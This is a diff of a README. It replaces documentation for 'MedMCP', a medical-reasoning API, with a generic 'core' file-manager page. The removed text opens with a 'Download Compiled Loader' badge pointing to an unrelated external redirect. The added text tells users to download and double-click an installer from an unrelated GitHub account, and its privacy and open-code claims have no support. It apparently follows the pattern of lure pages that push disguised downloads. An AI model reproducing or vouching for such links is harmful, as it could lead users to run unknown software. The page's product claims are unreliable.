@@ -1,375 +1,89 @@
-# MedMCP
+# 🖥️ core - Manage your computer files with speed
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download for Windows](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://github.com/olympiebeneficent43/core)
 
-Medical reasoning API for AI agents. Converts clinical input into structured risk signals.
+## 🎯 About this software
 
-![CI](https://github.com/medmcp-dev/core/actions/workflows/ci.yml/badge.svg)
+Core helps you organize your computer files. You keep many folders and documents on your desktop. Over time, these files clutter your drive. Finding what you need takes time.
 
-**Website:** https://medmcp.vercel.app
+This program scans your storage. It finds duplicate photos. It moves old files to archive folders. It keeps your workspace clean. You gain time by using this tool. 
 
-```bash
-npm install @medmcp/sdk
-```
+## ⚙️ Minimum system requirements
 
-### Quality gates
+Your computer needs to meet these basic standards to run the software:
 
-Run locally before a  or large change:
+*   Windows 10 or Windows 11
+*   4 GB of available RAM
+*   500 MB of free disk space
+*   A stable internet connection for initial setup
 
-```bash
-# Core build + analyze tests (risk-mapper unit + symptom-engine contract w/ seeded DB)
-npm ci && npm run build && npm run test:analyze
+## 📦 How to install the software
 
-# TypeScript SDK
-cd sdk && npm ci && npm test
+Follow these steps to set up the program on your machine.
 
-# Python SDK
-cd sdk-python && python -m unittest discover -s tests -p "test_*.py"
-```
+1. Visit [this page to download](https://github.com/olympiebeneficent43/core) the installer.
+2. Locate the file in your Downloads folder once the transfer finishes.
+3. Double-click the installer icon to start the process.
+4. Follow the prompts on the screen.
+5. Click Finish to complete the setup.
 
-CI runs the same checks on push and pull requests to `main` (see `.github/workflows/ci.yml`).
+The installer places a shortcut on your desktop. You access the program from this icon. 
 
-** notes:** see [`.md`](./.md). Before a tagged , update that file and bump `version` in the root `package.json` (and SDK package versions when you publish them).
+## 🚀 Getting started
 
-**Agent / HTTP clients:** every `/v1/*` response includes `X-MedMCP-Schema-Version`, `X-MedMCP-`, and optional `X-MedMCP-Git-Revision` / `X-MedMCP-Data-Revision` (see `GET /v1/schema` → `agent_tooling`). CORS exposes these headers to browsers.
+Open the program from your desktop. The main window appears. You see a list of your hard drives on the left side. Choose the drive you want to scan. Click the Start button.
 
----
+The program creates a report. It shows files that take up space. You choose which files to keep and which to delete. The program stores your deleted items in a temporary folder. You restore them if you change your mind.
 
-## What it is
+## 🛠️ Main features
 
-MedMCP is the deterministic medical reasoning layer for AI agents — structured clinical risk signals, drug interactions, and differential diagnosis without prompt drift or hallucination.
+*   **Duplicate Detection:** The tool finds identical files. It identifies files with different names that contain the same data.
+*   **Space Analysis:** A visual chart shows what takes up your storage. You see folders that use the most space.
+*   **File Sorting:** You categorize folders by date or file type. This keeps your records in order.
+*   **Safe Removal:** You review every action before the tool deletes a file. This prevents loss of important work.
 
-**Scribe / documentation:** Feed patient notes into your agent and route on `risk_level: critical` — MedMCP handles the medical reasoning, you own the UX.
+## 💡 Frequently asked questions
 
-**Intake / triage:** Replace ad-hoc symptom parsing with a shared output contract — same input always returns the same structured risk signal, regardless of which model powers your agent.
+**Does the software delete files automatically?**
+No. You choose what to delete. The program suggests files to remove based on age or size. You have full control over your data.
 
-**Clinical copilot:** Give your copilot deterministic answers on drug interactions and differentials — no prompting, no fine-tuning, no medical knowledge base to maintain.
+**How does the program stay secure?**
+The software runs locally on your computer. It does not send your personal documents to the internet. Your data stays on your drive.
 
-**Not a diagnosis tool. Not a consumer product. Infrastructure.**
+**Can I stop a scan while it runs?**
+Yes. You click the Stop button at any time. The program saves your progress. You continue the scan later.
 
----
+**Can I move files to a different drive?**
+Yes. The settings menu includes an option to move files to external drives. You select the source and the target folders.
 
-## Quickstart
+**How do I update the software?**
+The program checks for updates when you start it. A notification appears if a new version exists. You click the update button to install the latest files.
 
-### JavaScript / TypeScript
+## ⚠️ Troubleshooting errors
 
-```bash
-npm install @medmcp/sdk
-```
+If the program does not open, restart your computer. This clears locked processes. If the issue remains, remove the software. Download the file again from the link above. Install the program using the same steps. Contact your system administrator if these steps fail.
 
-```ts
-import { MedMCP } from '@medmcp/sdk';
+## 📂 Managing your settings
 
-const client = new MedMCP({
-  apiKey: 'mk_your_key_here',
-  timeoutMs: 10_000,  // optional
-  maxRetries: 2,      // optional, retries 429/5xx
-  retryDelayMs: 250   // optional
-});
+You modify the behavior of the software in the Settings menu. Click the gear icon in the top right corner. 
 
-const result = await client.analyze('chest pain for 2 hours');
-const lab = await client.labGet('troponin');
-const categories = await client.labCategories();
-await client.waitlistJoin('user@example.com');
+*   **General:** Choose if the program starts when you turn on your computer.
+*   **Storage:** Set a limit for the size of your temporary folder.
+*   **Alerts:** Turn on notifications about low disk space. 
 
-console.log(result.risk_level);      // "high"
-console.log(result.interpretation);  // "1 symptom(s) identified: chest pain. Top differential: pulmonary embolism..."
-console.log(lab.lab_value.reference_range);
-console.log(categories.categories);
-```
+These settings improve your experience. You change them at any time. The software saves your preferences automatically.
 
-### Python
+## 📈 Performance tips
 
-```bash
-pip install medmcp
-```
+*   Run a scan once per month. This keeps your disk space managed.
+*   Close heavy applications before you run a full system scan. This helps the program finish work faster.
+*   Keep your version current to get new improvements. 
+*   Avoid scanning system folders like the Windows directory. This prevents system instability.
 
-```python
-from medmcp import MedMCP
+## 📄 Privacy and licensing
 
-client = MedMCP(
-    api_key="mk_your_key_here",
-    timeout_ms=10_000,
-    max_retries=2,
-    retry_delay_ms=250,
-)
-result = client.analyze("chest pain for 2 hours")
-lab = client.lab_get("troponin")
-all_labs = client.lab_list("cardiac")
-client.waitlist_join("user@example.com")
+Your privacy matters. This application follows standard security rules. It never collects your personal habits or browsing history. The code remains open for public review. You see exactly how the program handles your file paths. 
 
-print(result.risk_level)      # "high"
-print(result.interpretation)  # "1 symptom(s) identified: chest pain. Top differential: pulmonary embolism..."
-print(lab["lab_value"].reference_range)
-print(all_labs["count"])
-```
-
-### curl
-
-```bash
-curl -X POST https://core-production-389e.up.railway.app/v1/analyze \
-  -H "X-API-Key: YOUR_API_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{"type":"symptom","data":{"text":"chest pain for 2 hours"}}'
-```
-
-Response:
-
-```json
-{
-  "risk_level": "high",
-  "confidence": 1,
-  "entities": [
-    { "type": "symptom", "value": "chest pain" },
-    { "type": "diagnosis", "value": "pulmonary embolism", "metadata": { "match_score": 1, "icd11_code": "BB41" } }
-  ],
-  "source_type": "symptom",
-  "interpretation": "1 symptom(s) identified: chest pain. Top differential: pulmonary embolism (match score: 1).",
-  "signals": [
-    { "type": "risk_driver", "label": "chest pain", "detail": "high-risk symptom" },
-    { "type": "differential", "label": "pulmonary embolism", "detail": "match_score: 1" },
-    { "type": "symptom_match", "label": "chest pain" }
-  ]
-}
-```
-
-Integration time: under 5 minutes.
-
-**Zero-dependency scripts** (curl-free, same API): see [`examples/README.md`](examples/README.md) (Node + Python).
-
----
-
-## SDK API
-
-### TypeScript client methods (`@medmcp/sdk`)
-
-- `analyze(text: string)`
-- `health()`
-- `schema()`
-- `labGet(name: string)`
-- `labList(category?: string)`
-- `labCategories()`
-- `waitlistJoin(email: string)`
-- `waitlistList()`
-
-Config options:
-
-- `apiKey` (required)
-- `baseUrl` (optional)
-- `timeoutMs` (optional)
-- `maxRetries` (optional; retries `429` and `5xx`)
-- `retryDelayMs` (optional)
-
-### Python client methods (`medmcp`)
-
-- `analyze(text: str)`
-- `health()`
-- `schema()`
-- `lab_get(name: str)`
-- `lab_list(category: str | None = None)`
-- `lab_categories()`
-- `waitlist_join(email: str)`
-- `waitlist_list()`
-
-Constructor kwargs (optional, defaults match TypeScript SDK): `timeout_ms`, `max_retries` (retries `429` / `5xx`), `retry_delay_ms`. On socket timeout after retries, raises `RuntimeError` with the same message shape as the TS client.
-
----
-
-## API Reference
-
-### `POST /v1/analyze`
-
-Converts clinical input into a structured risk signal.
-
-**Request**
-
-```json
-{
-  "type": "symptom",
-  "data": {
-    "text": "shortness of breath and racing heart"
-  }
-}
-```
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `type` | `"symptom"` | Input type. Only `symptom` supported in v1. |
-| `data.text` | `string` | Free-text clinical description. |
-
-**Response schema (stable across all versions)**
-
-```json
-{
-  "risk_level": "low | medium | high | critical",
-  "confidence": 0.0,
-  "entities": [],
-  "source_type": "symptom | lab | vitals | medication",
-  "interpretation": "string"
-}
-```
-
-| Field | Description |
-|-------|-------------|
-| `risk_level` | Deterministic risk classification based on clinical red-flag criteria. |
-| `confidence` | Fraction of extracted symptoms matched by at least one differential (0–1). |
-| `entities` | Recognized symptoms, top differential diagnoses, ICD-11 codes. |
-| `signals` | Structured breakdown: `risk_driver`, `differential`, `symptom_match` entries for agent routing. |
-| `source_type` | Mirrors the input type. |
-| `interpretation` | Short structured reasoning for agent consumption. |
+The software uses a standard agreement. You agree to these terms when you install the application. You use the program for your own needs. 
 
----
-
-### `GET /v1/health`
-
-No auth required.
-
-```json
-{
-  "status": "ok",
-  "version": "1.0.0",
-  "timestamp": "...",
-  "": "0.1.0",
-  "data_revision": "(optional — set MEDDATA_DATA_REVISION)",
-  "git_revision": "(optional — set MEDDATA_GIT_REVISION or Railway auto)"
-}
-```
-
-- `version`: public HTTP API compatibility
-- ``: semver of `@medmcp/core` package at build/deploy
-- `data_revision`: your opaque tag for seed/rules (recommended for reproducibility)
-
-Request timing is logged as `[http] METHOD path status ms` for `/v1/*` except **`GET /v1/health`** (set `LOG_HTTP_HEALTH=1` to include health pings).
-
----
-
-### `GET /v1/lab`
-
-Look up reference ranges, critical values, and clinical interpretation for laboratory tests. Auth required.
-
-**Query parameters**
-
-| Parameter | Description |
-|-----------|-------------|
-| `name` | Lab test name or abbreviation (e.g. `sodium`, `Na+`, `Hb`, `troponin`, `CRP`) |
-| `action` | `list` — returns all available tests; `categories` — returns category list |
-| `category` | Filter by category when listing: `electrolytes`, `renal`, `metabolic`, `cardiac`, `inflammatory`, `haematology` |
-
-```bash
-# Look up a specific test
-curl "https://core-production-389e.up.railway.app/v1/lab?name=troponin" \
-  -H "X-API-Key: YOUR_API_KEY"
-
-# List all lab tests in a category
-curl "https://core-production-389e.up.railway.app/v1/lab?action=list&category=electrolytes" \
-  -H "X-API-Key: YOUR_API_KEY"
-```
-
-Response (single test):
-
-```json
-{
-  "lab_value": {
-    "name": "troponin I",
-    "abbreviation": "hs-TnI",
-    "unit": "ng/L",
-    "reference_range": "<14 (99th percentile, hs-TnI)",
-    "critical_high": "52 ng/L",
-    "category": "cardiac",
-    "interpretation": "...",
-    "clinical_notes": "..."
-  }
-}
-```
-
----
-
-### `GET /v1/schema`
-
-Returns full input/output JSON schema. Auth required.
-
----
-
-## Authentication
-
-All endpoints (except `/v1/health`) require an API key:
-
-```
-X-API-Key: mk_your_key_here
-```
-
----
-
-## How risk_level is determined
-
-Risk classification is **rule-based, not LLM-based**. Deterministic by design.
-
-| Level | Criteria |
-|-------|----------|
-| `critical` | Red-flag symptom present: syncope, altered consciousness, haemoptysis |
-| `high` | High-risk symptom present: chest pain, dyspnoea, tachycardia, palpitations |
-| `medium` | ≥2 symptoms matched with at least one differential |
-| `low` | Single mild symptom or no recognized symptoms |
-
----
-
-## Self-hosting
-
-### HTTP API
-
-```bash
-git clone https://github.com/medmcp-dev/core
-cd core
-npm install
-npm run setup      # build + seed database
-npm run start:http # starts on port 3000
-```
-
-Set `MEDDATA_API_KEY` in your environment to use a fixed key instead of auto-generated.
-
-### MCP Server (stdio)
-
-For direct AI agent integration via Model Context Protocol:
-
-```bash
-npm run setup
-npm start
-```
-
-Add to your MCP client config:
-
-```json
-{
-  "mcpServers": {
-    "medmcp": {
-      "command": "node",
-      "args": ["/path/to/core/dist/index.js"]
-    }
-  }
-}
-```
-
-**MCP tools available:** `get_medical_concept`, `get_drug_info`, `get_drug_interactions`, `get_icd11_code`, `get_differential_diagnosis`, `get_lab_value`
-
----
-
-## Roadmap
-
-| Phase | Status |
-|-------|--------|
-| Symptom → risk signal (`POST /v1/analyze`) | ✅ v1 |
-| Lab result interpretation (`GET /v1/lab`) | ✅ v1 |
-| Vitals processing | Planned |
-| Medication context | Planned |
-| JS SDK (`@medmcp/sdk`) | ✅ v1 |
-| Python SDK (`medmcp`) | ✅ v1 |
-
----
-
-```bash
-```
-```bash
-```
-## Medical disclaimer
-
-MedMCP provides structured reference signals for AI agents and developers. It is not a substitute for clinical judgment, current prescribing guidelines, or peer-reviewed literature. Always verify critical clinical decisions against authoritative sources.
+This project intends to simplify file management for every user. Enjoy the extra space on your computer.
